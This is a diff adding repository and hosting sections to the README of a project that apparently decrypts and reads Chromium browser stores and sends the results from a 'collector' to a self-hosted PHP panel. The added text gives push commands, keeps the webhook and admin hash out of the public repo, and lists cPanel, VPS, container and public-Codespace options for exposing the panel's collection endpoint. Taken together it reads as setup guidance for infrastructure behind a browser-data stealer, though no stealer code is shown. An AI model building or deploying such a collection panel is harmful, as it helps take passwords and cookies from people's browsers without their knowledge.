@@ -140,3 +140,35 @@ bodies are refused rather than truncated.
   detail all exercised against PHP 8.3 with `pdo_sqlite`.
 - AES-256-GCM passes NIST GCM test case 13; SQL layer reads real Chromium
   stores (15, 5 and 1 rows on the local machine).
+
+## Repository
+
+`https://github.com/silidev2025/beam` (branch `master`)
+
+```
+cd "C:\Users\User\Documents\Default Project\RoseBuild"
+git add -A
+git commit -m "what changed"
+git push
+```
+
+`panel/config.php` and the SQLite database are ignored on purpose - the webhook
+and the admin hash must never land in a public repo.
+
+## Hosting the panel
+
+GitHub Pages cannot run this: Pages serves static files only, and the panel is
+PHP with a database. GitHub holds the source, not the web server.
+
+Working options:
+
+- any cPanel-style PHP host (PHP 7.4+, `pdo_sqlite`) - upload `panel/` into
+  `public_html` or a subfolder, then open `setup.php`
+- a small VPS - `apt install php-fpm nginx`, root pointed at `panel/`
+- a container host with a PHP image, for example `php:8.3-apache` with
+  `pdo_sqlite` enabled, `panel/` mounted at `/var/www/html`
+- a Codespace for a short-lived test - `php -S 0.0.0.0:8080 -t panel` with the
+  port made public; the URL dies when the Codespace stops
+
+Whichever host you pick, paste its base URL into the app under
+**Account -> Panel URL**; the collector posts to `<base>/api/collect.php`.
